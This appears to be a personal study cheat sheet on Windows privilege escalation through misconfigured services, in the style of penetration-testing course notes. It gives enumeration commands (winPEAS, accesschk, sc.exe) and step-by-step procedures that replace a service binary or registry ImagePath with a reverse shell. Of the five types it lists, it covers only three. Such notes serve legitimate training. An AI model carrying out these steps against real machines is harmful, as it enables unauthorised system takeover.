Service Exploits


Service Commands:

Query the configuration			sc.exe qc <name>
	
Query the current status 		sc.exe query <name>

Modify a configuration option		sc.exe config <name> <option>= <value>

Start/Stop a service:			net start/stop <name>

Check the current values of registry	reg query <path>


Types:

1. Insecure Service Properties
2. Unquoted Service Path
3. Weak Registry Permissions
4. Insecure Service Executables
5. DLL Hijacking

1. Insecure Service Properties

If we can change the config of a service but not start/stop we cannot exploit it.


Step 1: Run winPEAS with serviceinfo or with accesschk and identify the vuln service

	winPEASany.exe quiet servicesinfo
	.\accesschk.exe /accepteula -uwcqv user daclsvc

Step 2: check the config with above service command.

step 3: Change the binary path of the service with our reverse shell.

step 4: Now start the service. we will get a reverse shell.

2. Unquoted Service Path

C:\Program Files\Some Dir\SomeProgram.exe

In the Unquoted Service Path the C:\Program is the executable and remaining are aruments.
It will search each each possibility of the argument.  

Step 1: Run winPEAS with serviceinfo, identify the Unquoted Service Path vuln and confirm
	with service config.

Step 2: Check for write permissions in each folder in the path.

	.\accesschk.exe /accepteula -uwdq <path>

Step 3: Create a reverse shell file in the writeable folder with the same name that after ending with 
	the \.

Step 4: Now start the service. we will get a reverse shell.

3. Weak Registry Permissions

In this we are able to modify the registry entry of a service.

Step 1: Run winPEAS with serviceinfo, identify the Weak Registry Permissions vuln

Step 2:	Confirm with Powershell and accesschk
	
	Get-Acl <path> | Format-List
	.\accesschk.exe /accepteula -uvwqk <path>

Step 3: Now check the current values or config of registry from the above service commands.
	identify the path.

Step 4: Overwrite the Registry key with our reverseshell

	reg add  <path> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

Step 5: Now start the service. we will get a reverse shell.
